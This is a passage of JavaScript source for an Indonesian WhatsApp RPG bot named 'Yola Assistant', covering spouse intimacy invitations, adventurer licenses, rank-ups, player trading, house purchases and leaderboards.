                if (pendingSeksRequests[m.sender] && pendingSeksRequests[m.sender].requesterJid === targetJid) {
                    return reply(`────୨ Yola Assistant ৎ────\n⏳ Pasangan Kakak, @${targetJid.split('@')[0]} udah ngajakin Kakak loh! Terima atau tolak dulu ajakannya yaa~\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                }

                pendingSeksRequests[targetJid] = {
                    requesterJid: m.sender,
                    timestamp: Date.now()
                };
                savePendingSeksRequests();

                const myName = registeredUsers[m.sender].name;
                const targetName = targetUser.name;

                let seksInviteMessageText = `────୨ Yola Assistant ৎ────\n🥵💦 *Ada Ajakan Panas dari Pasanganmu!* 💦🥵\n\nPasangan Kakak, *${myName}* (ID: ${userRPG.rpgId}), ngajakin Kakak buat berhubungan intim nih...\n\nKakak bersedia gak? 😉 Pikirin baik-baik yaa~\n────୨ Yola Assistant ৎ────`;
                let messageOptions = {
                    text: seksInviteMessageText,
                    footer: 'Jawab pakai hati yaa... ❤️‍🔥',
                    contextInfo: {
                        mentionedJid: [m.sender, targetJid],
                        ...defaultContextInfoBuilder(pushname, command)
                    }
                };

                if (currentMenuStyle === 'V1') {
                    messageOptions.buttons = [{
                        buttonId: `handle_seks_accept_${m.sender}`,
                        buttonText: {
                            displayText: '🔥 Iya, Aku Mau Banget!'
                        },
                        type: 1
                    }, {
                        buttonId: `handle_seks_reject_${m.sender}`,
                        buttonText: {
                            displayText: '💔 Maaf, Gak Sekarang'
                        },
                        type: 1
                    }];
                    messageOptions.headerType = 1;
                } else {
                    await reply(`${seksInviteMessageText}\n\nKetik:\n • \`${prefix}acceptseks ${userRPG.rpgId}\` (untuk terima)\n • \`${prefix}rejectseks ${userRPG.rpgId}\` (untuk tolak)`);
                }
                if (currentMenuStyle === 'V1') {
                    await yola.sendMessage(targetJid, messageOptions);
                }

                await reply(`────୨ Yola Assistant ৎ────\n💌 Ajakan intim Kakak buat @${targetJid.split('@')[0]} udah Yola kirim! Semoga diterima yaa~ 😏\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
            }
            break;
            case 'acceptseks':
            case 'handle_seks_accept': {
                if (!isRegistered) return reply(`────୨ Yola Assistant ৎ────\n⚔️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────`);

                const requesterIdentifier = command === 'acceptseks' ? args[0] : body.split('_')[3];
                if (!requesterIdentifier) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau nerima ajakan dari siapa nih, Kak? Pastiin ini respons tombol yang bener yaa.\n────୨ Yola Assistant ৎ────`);

                const requesterJid = command === 'acceptseks' ? findUserJid(requesterIdentifier, m) : requesterIdentifier;

                if (!requesterJid || !registeredUsers[requesterJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Pengajak dengan ID/input "${requesterIdentifier}" gak Yola temuin atau belum terdaftar.\n────୨ Yola Assistant ৎ────`);

                if (userRPG.spouse !== requesterJid) return reply("────୨ Yola Assistant ৎ────\n💔 Kakak kan gak nikah sama orang ini...\n────୨ Yola Assistant ৎ────");

                const seksRequest = pendingSeksRequests[m.sender];
                if (!seksRequest || seksRequest.requesterJid !== requesterJid) return reply(`────୨ Yola Assistant ৎ────\n❌ Gak ada ajakan intim aktif dari @${requesterJid.split('@')[0]} buat Kakak.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [requesterJid]
                });

                const now = Date.now();
                if (now - (userRPG.lastSeksTimestamp || 0) < SEKS_COOLDOWN || now - (registeredUsers[requesterJid].rpg.lastSeksTimestamp || 0) < SEKS_COOLDOWN) {
                    delete pendingSeksRequests[m.sender];
                    savePendingSeksRequests();
                    return reply("────୨ Yola Assistant ৎ────\n🥵 Aduh, salah satu dari kalian baru aja ngelakuin itu... Cooldownnya belum selesai nih.\n────୨ Yola Assistant ৎ────");
                }

                userRPG.lastSeksTimestamp = now;
                registeredUsers[requesterJid].rpg.lastSeksTimestamp = now;
                delete pendingSeksRequests[m.sender];

                saveUsers(m.sender);
                saveUsers(requesterJid);
                savePendingSeksRequests();

                const user1 = registeredUsers[requesterJid];
                const user2 = registeredUsers[m.sender];
                const name1 = user1.name;
                const name2 = user2.name;

                await reply(`────୨ Yola Assistant ৎ────\n🔥 Kakak nerima ajakan dari @${requesterJid.split('@')[0]}! Siap-siap yaa buat ronde panasnya... 🔥\n────୨ Yola Assistant ৎ────`, {
                    mentions: [requesterJid]
                });
                await yola.sendMessage(requesterJid, {
                    text: `────୨ Yola Assistant ৎ────\n🔥 Yeay! Ajakan Kakak buat *${name2}* diterima! Saatnya beraksi... 🔥\n────୨ Yola Assistant ৎ────`,
                    contextInfo: {
                        mentionedJid: [m.sender]
                    }
                });

                await runSeksSimulation(yola, m.chat, requesterJid, m.sender);
            }
            break;
            case 'rejectseks':
            case 'handle_seks_reject': {
                if (!isRegistered) return reply(`────୨ Yola Assistant ৎ────\n⚔️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────`);

                const requesterIdentifier = command === 'rejectseks' ? args[0] : body.split('_')[3];
                if (!requesterIdentifier) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau nolak ajakan dari siapa nih, Kak? Pastiin ini respons tombol yang bener yaa.\n────୨ Yola Assistant ৎ────`);

                const requesterJid = command === 'rejectseks' ? findUserJid(requesterIdentifier, m) : requesterIdentifier;

                if (!requesterJid || !registeredUsers[requesterJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Pengajak dengan ID/input "${requesterIdentifier}" gak Yola temuin atau belum terdaftar.\n────୨ Yola Assistant ৎ────`);

                if (userRPG.spouse !== requesterJid) return reply("────୨ Yola Assistant ৎ────\n💔 Kakak kan gak nikah sama orang ini...\n────୨ Yola Assistant ৎ────");

                const seksRequest = pendingSeksRequests[m.sender];
                if (!seksRequest || seksRequest.requesterJid !== requesterJid) return reply(`────୨ Yola Assistant ৎ────\n❌ Gak ada ajakan intim aktif dari @${requesterJid.split('@')[0]} buat Kakak.\n────୨ Yola Assistant ৎ────`, {
                    mentionedJid: [requesterJid]
                });

                delete pendingSeksRequests[m.sender];
                savePendingSeksRequests();

                const myName = registeredUsers[m.sender].name;
                await reply(`────୨ Yola Assistant ৎ────\n💔 Oke. Kakak nolak ajakan intim dari @${requesterJid.split('@')[0]}. Mungkin lain kali yaa~\n────୨ Yola Assistant ৎ────`, {
                    mentionedJid: [requesterJid]
                });
                await yola.sendMessage(requesterJid, {
                    text: `────୨ Yola Assistant ৎ────\n💔 Aduh, maaf yaa... Ajakan intim Kakak buat *${myName}* (ID: ${userRPG.rpgId}) ditolak nih... Jangan sedih yaa!\n────୨ Yola Assistant ৎ────`,
                    contextInfo: {
                        mentionedJid: [m.sender]
                    }
                });
            }
            break;
            case 'requestlicense': {
                if (!isRegistered) return reply("────୨ Yola Assistant ৎ────\nDaftar dulu dong, Kak!\n────୨ Yola Assistant ৎ────");
                if (userRPG.license) return reply("────୨ Yola Assistant ৎ────\nKakak udah punya lisensi petualang kok! Semangat yaa~\n────୨ Yola Assistant ৎ────");
                if (userRPG.level < LICENSE_LEVEL_REQ) return reply(`────୨ Yola Assistant ৎ────\nAduh, level Kakak (${userRPG.level}) belum cukup buat dapet lisensi. Minimal Lv.${LICENSE_LEVEL_REQ} yaa.\n────୨ Yola Assistant ৎ────`);
                const licenseCost = 500;
                if (userRPG.currency.gold < licenseCost) return reply(`────୨ Yola Assistant ৎ────\nEmas Kakak (${userRPG.currency.gold || 0}) gak cukup nih buat bikin lisensi (Perlu ${licenseCost} 🪙).\n────୨ Yola Assistant ৎ────`);

                userRPG.currency.gold -= licenseCost;
                userRPG.license = true;
                saveUsers(m.sender);
                reply(`────୨ Yola Assistant ৎ────\n📜 Yeay! Lisensi petualang berhasil dibuat! Sekarang Kakak resmi jadi petualang sejati! -${licenseCost} 🪙 Emas.\n────୨ Yola Assistant ৎ────`);
            }
            break;
            case 'uprank': {
                if (!isRegistered) return reply("────୨ Yola Assistant ৎ────\nDaftar dulu dong, Kak!\n────୨ Yola Assistant ৎ────");
                if (!userRPG.license) return reply("────୨ Yola Assistant ৎ────\nKakak belum punya lisensi petualang. Bikin dulu pakai `.requestlicense` yaa~\n────୨ Yola Assistant ৎ────");
                if ((userRPG.currency.gold || 0) < UPRANK_GOLD_COST) return reply(`────୨ Yola Assistant ৎ────\nAduh, emas Kakak (${userRPG.currency.gold || 0}) gak cukup buat naik rank. Butuh ${UPRANK_GOLD_COST} 🪙 yaa.\n────୨ Yola Assistant ৎ────`);


                const currentRank = getRankByTotalXp(userRPG.totalXpEarned);
                const rankKeys = Object.keys(rankThresholds);
                const currentRankIndex = rankKeys.indexOf(currentRank);
                if (currentRankIndex === -1 || currentRankIndex === rankKeys.length - 1) {
                    return reply("────୨ Yola Assistant ৎ────\n🏆 Kakak udah ada di rank tertinggi! Keren banget! >_<\n────୨ Yola Assistant ৎ────");
                }

                const nextRank = rankKeys[currentRankIndex + 1];
                const xpNeededForNextRank = rankThresholds[nextRank];


                if ((userRPG.totalXpEarned || 0) < xpNeededForNextRank) {
                    return reply(`────୨ Yola Assistant ৎ────\nAduh, Total XP Kakak (${toRupiah(userRPG.totalXpEarned || 0)}) belum cukup buat naik ke Rank *${nextRank}* (Perlu ${toRupiah(xpNeededForNextRank)} Total XP). Semangat lagi yaa!\n────୨ Yola Assistant ৎ────`);
                }

                userRPG.currency.gold -= UPRANK_GOLD_COST;
                userRPG.rank = nextRank; // Update rank immediately upon meeting XP requirement and paying cost
                saveUsers(m.sender);
                reply(`────୨ Yola Assistant ৎ────\n🎉✨ SELAMAT! Kakak berhasil naik ke Rank *${nextRank}*! Makin jago aja nih! -${UPRANK_GOLD_COST} 🪙 Emas.\n────୨ Yola Assistant ৎ────`);
            }
            break;
            case 'trade': {
                if (!isRegistered) return reply("────୨ Yola Assistant ৎ────\nDaftar dulu dong, Kak!\n────୨ Yola Assistant ৎ────");
                if (args.length < 5) return reply(`────୨ Yola Assistant ৎ────\nFormatnya gini ya, Kak: ${prefix}trade [@target_id] [item_kamu_id] [jumlah_kamu] [item_target_id] [jumlah_target] [emas_kamu_ke_target (opsional, bisa negatif jika minta emas)]\nContoh: ${prefix}trade @Yola potion 5 kulit-goblin 10 100\n────୨ Yola Assistant ৎ────`);

                const targetJid = findUserJid(args[0], m);
                if (!targetJid || !registeredUsers[targetJid]?.rpg || targetJid === m.sender) return reply("────୨ Yola Assistant ৎ────\nTargetnya gak valid atau gak bisa dagang sama diri sendiri, Kak.\n────୨ Yola Assistant ৎ────");

                const itemAndaId = args[1].toLowerCase();
                const jumlahAnda = parseInt(args[2]);
                const itemTargetId = args[3].toLowerCase();
                const jumlahTarget = parseInt(args[4]);
                const goldAndaKeTarget = args[5] ? parseInt(args[5]) : 0;

                if (!rpgItems[itemAndaId] || !rpgItems[itemTargetId]) return reply("────୨ Yola Assistant ৎ────\nAda ID item yang gak valid tuh, Kak.\n────୨ Yola Assistant ৎ────");
                if (isNaN(jumlahAnda) || jumlahAnda <= 0 || isNaN(jumlahTarget) || jumlahTarget <= 0 || isNaN(goldAndaKeTarget)) return reply("────୨ Yola Assistant ৎ────\nJumlah item atau emasnya gak valid, Kak.\n────୨ Yola Assistant ৎ────");


                if ((userRPG.inventory[itemAndaId] || 0) < jumlahAnda) return reply(`────୨ Yola Assistant ৎ────\nKakak gak punya cukup *${capital(rpgItems[itemAndaId].name)}*.\n────୨ Yola Assistant ৎ────`);
                if (goldAndaKeTarget > 0 && (userRPG.currency.gold || 0) < goldAndaKeTarget) return reply(`────୨ Yola Assistant ৎ────\nEmas Kakak gak cukup buat nawarin segitu.\n────୨ Yola Assistant ৎ────`);

                const targetUser = registeredUsers[targetJid];
                if ((targetUser.rpg.inventory[itemTargetId] || 0) < jumlahTarget) {
                    return reply(`────୨ Yola Assistant ৎ────\n@${targetJid.split('@')[0]} gak punya cukup *${capital(rpgItems[itemTargetId].name)}* buat dituker.\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                }
                if (goldAndaKeTarget < 0 && (targetUser.rpg.currency.gold || 0) < Math.abs(goldAndaKeTarget)) {
                    return reply(`────୨ Yola Assistant ৎ────\n@${targetJid.split('@')[0]} gak punya cukup emas buat nawarin segitu.\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                }
                if (targetUser.rpg.pendingAction || targetUser.rpg.currentAction) {
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, @${targetJid.split('@')[0]} lagi sibuk atau lagi siap-siap mau ngapain gitu... Gak bisa dagang sekarang.\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                }
                // Check if user is already in a pending trade
                if(Object.values(pendingTrades).some(trade => trade.proposer === m.sender || trade.target === m.sender)) {
                     return reply("────୨ Yola Assistant ৎ────\n❌ Kakak lagi ada tawaran dagang yang masih nunggu jawaban. Selesain dulu ya.\n────୨ Yola Assistant ৎ────");
                }
                // Check if target is already in a pending trade
                if(Object.values(pendingTrades).some(trade => trade.proposer === targetJid || trade.target === targetJid)) {
                     return reply(`────୨ Yola Assistant ৎ────\n❌ @${targetJid.split('@')[0]} lagi ada tawaran dagang yang masih nunggu jawaban. Coba lagi nanti ya.\n────୨ Yola Assistant ৎ────`, { mentions: [targetJid] });
                }


                const tradeId = `trade_${m.sender.split('@')[0]}_${targetJid.split('@')[0]}_${Date.now()}`;
                pendingTrades[tradeId] = {
                    proposer: m.sender,
                    proposerItem: itemAndaId,
                    proposerAmount: jumlahAnda,
                    proposerGold: goldAndaKeTarget,
                    target: targetJid,
                    targetItem: itemTargetId,
                    targetAmount: jumlahTarget,
                    timestamp: Date.now()
                };
                savePendingTrades();

                let tradeOfferText = `────୨ Yola Assistant ৎ────\n🔄 *Tawaran Dagang dari @${m.sender.split('@')[0]}!* 🔄\n\n`;
                tradeOfferText += `Dia nawarin: *${jumlahAnda}x ${capital(rpgItems[itemAndaId].name)}*`;
                if (goldAndaKeTarget > 0) tradeOfferText += ` dan *${goldAndaKeTarget} 🪙 Emas*`;
                else if (goldAndaKeTarget < 0) tradeOfferText += ` (Minta Emas: *${Math.abs(goldAndaKeTarget)} 🪙*)`;
                tradeOfferText += `\n\nMinta dari Kakak: *${jumlahTarget}x ${capital(rpgItems[itemTargetId].name)}*`;
                if (goldAndaKeTarget < 0 && targetUser.rpg.currency.gold >= Math.abs(goldAndaKeTarget)) {

                } else if (goldAndaKeTarget > 0 && userRPG.currency.gold >= goldAndaKeTarget) {

                }
                tradeOfferText += `\n\nSetuju gak nih, Kak @${targetJid.split('@')[0]}?\n────୨ Yola Assistant ৎ────`;

                let messageOptions = {
                    text: tradeOfferText,
                    footer: "Pikirin baik-baik yaa~",
                    contextInfo: {
                        mentionedJid: [m.sender, targetJid],
                        ...defaultContextInfoBuilder(pushname, command)
                    }
                };

                if (currentMenuStyle === 'V1') {
                    messageOptions.buttons = [{
                        buttonId: `handle_trade_confirm_${tradeId}`,
                        buttonText: {
                            displayText: '✅ Terima Tawaran'
                        },
                        type: 1
                    }, {
                        buttonId: `handle_trade_reject_${tradeId}`,
                        buttonText: {
                            displayText: '❌ Tolak Tawaran'
                        },
                        type: 1
                    }];
                    messageOptions.headerType = 1;
                } else {
                    await reply(`${tradeOfferText}\n\nKetik:\n • \`${prefix}accepttrade ${tradeId}\` (untuk terima)\n • \`${prefix}rejecttrade ${tradeId}\` (untuk tolak)`);
                }

                if (currentMenuStyle === 'V1') {
                    await yola.sendMessage(targetJid, messageOptions);
                }
                reply(`────୨ Yola Assistant ৎ────\n✅ Tawaran dagang buat @${targetJid.split('@')[0]} udah Yola kirim! Tunggu jawabannya yaa~\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
            }
            break;
            case 'accepttrade':
            case 'handle_trade_confirm': {
                const tradeId = command === 'accepttrade' ? args[0] : body.split('_')[2];
                if (!tradeId) return reply("────୨ Yola Assistant ৎ────\nID dagangnya mana nih, Kak?\n────୨ Yola Assistant ৎ────");

                const trade = pendingTrades[tradeId];
                if (!trade || trade.target !== m.sender) return reply("────୨ Yola Assistant ৎ────\nIni bukan tawaran dagang buat Kakak atau udah gak valid.\n────୨ Yola Assistant ৎ────");

                const proposerUser = registeredUsers[trade.proposer];
                const targetUser = registeredUsers[trade.target];

                if (!proposerUser?.rpg || !targetUser?.rpg) {
                    delete pendingTrades[tradeId];
                    savePendingTrades();
                    return reply("────୨ Yola Assistant ৎ────\nAduh, data salah satu petualang ada yang ilang nih...\n────୨ Yola Assistant ৎ────");
                }

                if (!proposerUser.rpg.inventory[trade.proposerItem] || (proposerUser.rpg.inventory[trade.proposerItem] || 0) < trade.proposerAmount) {
                    delete pendingTrades[tradeId];
                    savePendingTrades();
                    return reply(`────୨ Yola Assistant ৎ────\nHmph! @${trade.proposer.split('@')[0]} udah gak punya cukup *${capital(rpgItems[trade.proposerItem].name)}* lagi. Dagang batal yaa.\n────୨ Yola Assistant ৎ────`, {
                        mentions: [trade.proposer]
                    });
                }
                if (trade.proposerGold > 0 && (proposerUser.rpg.currency.gold || 0) < trade.proposerGold) {
                    delete pendingTrades[tradeId];
                    savePendingTrades();
                    return reply(`────୨ Yola Assistant ৎ────\nHmph! Emas @${trade.proposer.split('@')[0]} udah gak cukup. Dagang batal yaa.\n────୨ Yola Assistant ৎ────`, {
                        mentions: [trade.proposer]
                    });
                }
                if (!targetUser.rpg.inventory[trade.targetItem] || (targetUser.rpg.inventory[trade.targetItem] || 0) < trade.targetAmount) {
                    delete pendingTrades[tradeId];
                    savePendingTrades();
                    return reply(`────୨ Yola Assistant ৎ────\nKakak udah gak punya cukup *${capital(rpgItems[trade.targetItem].name)}* lagi. Dagang batal yaa.\n────୨ Yola Assistant ৎ────`);
                }
                if (trade.proposerGold < 0 && (targetUser.rpg.currency.gold || 0) < Math.abs(trade.proposerGold)) {
                    delete pendingTrades[tradeId];
                    savePendingTrades();
                    return reply(`────୨ Yola Assistant ৎ────\nEmas Kakak udah gak cukup. Dagang batal yaa.\n────୨ Yola Assistant ৎ────`);
                }
                 if (targetUser.rpg.pendingAction || targetUser.rpg.currentAction) {
                     delete pendingTrades[tradeId];
                     savePendingTrades();
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, Kakak lagi sibuk atau lagi siap-siap mau ngapain gitu... Gak bisa dagang sekarang.\n────୨ Yola Assistant ৎ────`);
                }
                 if (proposerUser.rpg.pendingAction || proposerUser.rpg.currentAction) {
                     delete pendingTrades[tradeId];
                     savePendingTrades();
                    return reply(`────୨ Yola Assistant ৎ────\n❌ Aduh, @${trade.proposer.split('@')[0]} lagi sibuk atau lagi siap-siap mau ngapain gitu... Dagang batal yaa.\n────୨ Yola Assistant ৎ────`, {
                         mentions: [trade.proposer]
                     });
                 }


                proposerUser.rpg.inventory[trade.proposerItem] -= trade.proposerAmount;
                if (proposerUser.rpg.inventory[trade.proposerItem] <= 0) delete proposerUser.rpg.inventory[trade.proposerItem];
                targetUser.rpg.inventory[trade.proposerItem] = (targetUser.rpg.inventory[trade.proposerItem] || 0) + trade.proposerAmount;

                targetUser.rpg.inventory[trade.targetItem] -= trade.targetAmount;
                if (targetUser.rpg.inventory[trade.targetItem] <= 0) delete targetUser.rpg.inventory[trade.targetItem];
                proposerUser.rpg.inventory[trade.targetItem] = (proposerUser.rpg.inventory[trade.targetItem] || 0) + trade.targetAmount;

                if (trade.proposerGold !== 0) {
                    proposerUser.rpg.currency.gold -= trade.proposerGold;
                    targetUser.rpg.currency.gold += trade.proposerGold;
                }


                if (proposerUser.rpg.guildId && guilds[proposerUser.rpg.guildId]) guilds[proposerUser.rpg.guildId].points = (guilds[proposerUser.rpg.guildId].points || 0) + 1;
                if (targetUser.rpg.guildId && guilds[targetUser.rpg.guildId]) guilds[targetUser.rpg.guildId].points = (guilds[targetUser.rpg.guildId].points || 0) + 1;
                if (proposerUser.rpg.partyId && parties[proposerUser.rpg.partyId]) parties[proposerUser.rpg.partyId].points = (parties[proposerUser.rpg.partyId].points || 0) + 1;
                if (targetUser.rpg.partyId && parties[targetUser.rpg.partyId]) parties[targetUser.rpg.partyId].points = (parties[targetUser.rpg.partyId].points || 0) + 1;


                saveUsers(trade.proposer);
                saveUsers(trade.target);
                saveGuilds();
                saveParties();
                delete pendingTrades[tradeId];
                savePendingTrades();

                await reply(`────୨ Yola Assistant ৎ────\n✅ Yeay! Dagang sama @${trade.proposer.split('@')[0]} berhasil! Item dan emas udah dituker yaa~\n────୨ Yola Assistant ৎ────`, {
                    mentions: [trade.proposer]
                });
                await yola.sendMessage(trade.proposer, `────୨ Yola Assistant ৎ────\n✅ Yeay! Tawaran dagang Kakak diterima sama @${trade.target.split('@')[0]}! Item dan emas udah dituker yaa~\n────୨ Yola Assistant ৎ────`, {
                    mentions: [trade.target]
                });
            }
            break;
            case 'rejecttrade':
            case 'handle_trade_reject': {
                const tradeId = command === 'rejecttrade' ? args[0] : body.split('_')[2];
                if (!tradeId) return reply("────୨ Yola Assistant ৎ────\nID dagangnya mana nih, Kak?\n────୨ Yola Assistant ৎ────");

                const trade = pendingTrades[tradeId];
                if (!trade || trade.target !== m.sender) return reply("────୨ Yola Assistant ৎ────\nIni bukan tawaran dagang buat Kakak atau udah gak valid.\n────୨ Yola Assistant ৎ────");

                delete pendingTrades[tradeId]; 
                savePendingTrades();

                await reply(`────୨ Yola Assistant ৎ────\n❌ Oke. Kakak nolak tawaran dagang dari @${trade.proposer.split('@')[0]}.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [trade.proposer]
                });
                await yola.sendMessage(trade.proposer, `────୨ Yola Assistant ৎ────\n💔 Aduh, tawaran dagang Kakak ditolak nih sama @${trade.target.split('@')[0]}...\n────୨ Yola Assistant ৎ────`, {
                    mentions: [trade.target]
                });
            }
            break;
            case 'canceltrade': {
                if (!args[0]) return reply("────୨ Yola Assistant ৎ────\nMau batalin dagang yang mana nih, Kak? Masukin ID dagangnya ya.\n────୨ Yola Assistant ৎ────");
                const tradeIdToCancel = args[0];
                const tradeToCancel = pendingTrades[tradeIdToCancel];

                if (!tradeToCancel || tradeToCancel.proposer !== m.sender) return reply("────୨ Yola Assistant ৎ────\nIni bukan tawaran dagang dari Kakak atau udah gak valid.\n────୨ Yola Assistant ৎ────");

                delete pendingTrades[tradeIdToCancel];
                savePendingTrades();
                reply(`────୨ Yola Assistant ৎ────\n🗑️ Oke! Tawaran dagang Kakak (ID: ${tradeIdToCancel}) buat @${tradeToCancel.target.split('@')[0]} udah Yola batalin.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [tradeToCancel.target]
                });
                await yola.sendMessage(tradeToCancel.target, `────୨ Yola Assistant ৎ────\nℹ️ Info nih: Tawaran dagang dari @${m.sender.split('@')[0]} (ID: ${tradeIdToCancel}) udah dibatalin sama dianya.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [m.sender]
                });
            }
            break;
            case 'listhouse': {
                if (!isRegistered) return reply("────୨ Yola Assistant ৎ────\nDaftar dulu dong, Kak!\n────୨ Yola Assistant ৎ────");
                let houseListText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ *Daftar Rumah yang Bisa Dibeli* 🏡\n│✧\n`;
                if (Object.keys(rpgHouses).length === 0) {
                    houseListText += `│✧ _Aduh, kayaknya belum ada rumah yang dijual nih..._\n`;
                } else {
                    for (const houseId in rpgHouses) {
                        const house = rpgHouses[houseId];
                        houseListText += `│✧ *ID: \`${house.id}\` - ${house.name}*\n│✧    _${house.description}_\n│✧    Harga: ${house.price} 🪙 Emas\n│✧    Beli: *${prefix}buyhouse ${house.id}*\n│✧\n`;
                    }
                }
                houseListText += `╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
                await reply(`${houseListText}`);
            }
            break;
            case 'buyhouse': {
                if (!isRegistered) return reply("────୨ Yola Assistant ৎ────\nDaftar dulu dong, Kak!\n────୨ Yola Assistant ৎ────");
                const houseIdToBuy = args[0];
                if (!houseIdToBuy) return reply("────୨ Yola Assistant ৎ────\nMau beli rumah yang mana nih, Kak? Masukin ID rumahnya ya.\n────୨ Yola Assistant ৎ────");

                if (userRPG.houseId) return reply(`────୨ Yola Assistant ৎ────\nKakak udah punya rumah kok: *${rpgHouses[userRPG.houseId]?.name || 'Rumah Misterius'}*. Gak bisa punya banyak rumah yaa~\n────୨ Yola Assistant ৎ────`);

                const houseData = rpgHouses[houseIdToBuy];
                if (!houseData) return reply(`────୨ Yola Assistant ৎ────\nHmph! Rumah dengan ID \`${houseIdToBuy}\` gak Yola temuin.\n────୨ Yola Assistant ৎ────`);

                if (userRPG.currency.gold < houseData.price) return reply(`────୨ Yola Assistant ৎ────\nAduh, Emas Kakak (${userRPG.currency.gold || 0}) gak cukup buat beli rumah *${houseData.name}* (Perlu ${houseData.price} 🪙).\n────୨ Yola Assistant ৎ────`);

                userRPG.currency.gold -= houseData.price;
                userRPG.houseId = houseIdToBuy;
                saveUsers(m.sender);
                reply(`────୨ Yola Assistant ৎ────\n🎉 Yeay! Selamat! Kakak berhasil beli rumah *${houseData.name}* seharga ${houseData.price} 🪙 Emas! Sekarang punya tempat tinggal deh~ \n────୨ Yola Assistant ৎ────`);
            }
            break;
            case 'myhouse': {
                if (!isRegistered) return reply("────୨ Yola Assistant ৎ────\nDaftar dulu dong, Kak!\n────୨ Yola Assistant ৎ────");
                if (!userRPG.houseId) return reply("────୨ Yola Assistant ৎ────\nKakak belum punya rumah nih... Yuk beli satu pakai `.listhouse` terus `.buyhouse [id]`!\n────୨ Yola Assistant ৎ────");

                const ownedHouse = rpgHouses[userRPG.houseId];
                if (!ownedHouse) {
                    userRPG.houseId = null;
                    saveUsers(m.sender);
                    return reply("────୨ Yola Assistant ৎ────\nAduh, data rumah Kakak ada yang aneh nih... Status rumah Kakak Yola reset ya. Sekarang Kakak gak menikah.\n────୨ Yola Assistant ৎ────");
                }
                reply(`┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ *Ini Rumah Punya Kakak* 🏡\n│✧\n│✧ *Nama:* ${ownedHouse.name}\n│✧ *Deskripsi:* ${ownedHouse.description}\n│✧\n│✧ Selamat menikmati rumah barunya yaa~ >_<\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`);
            }
            break;
            case 'leaderboard': {
                const type = args[0]?.toLowerCase();
                let leaderboardText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ *Papan Peringkat Yola Asisten* 🏆\n│✧\n`;
                const allUsersArray = Object.entries(registeredUsers).filter(([jid, data]) => data.rpg && data.name).map(([jid, data]) => ({
                    jid,
                    ...data.rpg,
                    rpgId: data.rpgId,
                    name: data.name
                }));

                if (!type || type === 'petualang' || type === 'adventurer') {
                    leaderboardText += "│✧ 🌟 *Top Petualang (XP & Rank):*\n";
                    const rankOrder = Object.keys(rankThresholds).reverse();
                    allUsersArray.sort((a, b) => {
                        const rankComparison = rankOrder.indexOf(getRankByTotalXp(a.totalXpEarned)) - rankOrder.indexOf(getRankByTotalXp(b.totalXpEarned));
                        if (rankComparison !== 0) return rankComparison;
                        return (b.totalXpEarned || 0) - (a.totalXpEarned || 0);
                    });
                    const topAdventurers = allUsersArray.slice(0, 10);
                    if (topAdventurers.length === 0) {
                        leaderboardText += `│✧ _Belum ada petualang di papan peringkat._\n`;
                    } else {
                        topAdventurers.forEach((user, index) => {
                            leaderboardText += `│✧ ${index + 1}. ${user.name} (ID: ${user.rpgId}) - Rank: ${getRankByTotalXp(user.totalXpEarned)}, Lv: ${user.level}, Total XP: ${toRupiah(user.totalXpEarned || 0)}\n`;
                        });
                    }
                } else if (type === 'guild') {
                    leaderboardText += "│✧ 🏰 *Top Guild (Poin):*\n";
                    const guildsArray = Object.values(guilds).filter(g => g.name && g.members.length > 0);
                    guildsArray.sort((a, b) => (b.points || 0) - (a.points || 0));
                    const topGuilds = guildsArray.slice(0, 10);
                    if (topGuilds.length === 0) {
                        leaderboardText += `│✧ _Belum ada guild di papan peringkat._\n`;
                    } else {
                        topGuilds.forEach((guild, index) => {
                            const leaderName = registeredUsers[guild.leader]?.name || guild.leader.split('@')[0];
                            leaderboardText += `│✧ ${index + 1}. ${guild.name} (ID: ${guild.id}) - Poin: ${guild.points || 0}, Leader: ${leaderName}\n`;
                        });
                    }
                } else if (type === 'party') {
                    leaderboardText += "│✧ 👨‍👩‍👧‍👦 *Top Party (Poin):*\n";
                    const partiesArray = Object.values(parties).filter(p => p.members.length > 0);
                    partiesArray.sort((a, b) => (b.points || 0) - (a.points || 0));
                    const topParties = partiesArray.slice(0, 10);
                    if (topParties.length === 0) {
                        leaderboardText += `│✧ _Belum ada party di papan peringkat._\n`;
                    } else {
                        topParties.forEach((party, index) => {
                            const leaderName = registeredUsers[party.leader]?.name || party.leader.split('@')[0];
                            leaderboardText += `│✧ ${index + 1}. Party Name: ${party.name || `Party ID: ${party.id.split('_')[1]}`} - Poin: ${party.points || 0}, Leader: ${leaderName}\n`;
                        });
                    }
                } else {
                    return reply("────୨ Yola Assistant ৎ────\nMau liat leaderboard apa nih, Kak? Pilihannya: `petualang`, `guild`, atau `party`.\n────୨ Yola Assistant ৎ────");
                }
                leaderboardText += `╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
                await reply(`${leaderboardText}`);
            }
            break;
            case 'jobs':
            case 'job': {
                if (!isRegistered) return reply("────୨ Yola Assistant ৎ────\nDaftar dulu dong, Kak!\n────୨ Yola Assistant ৎ────");
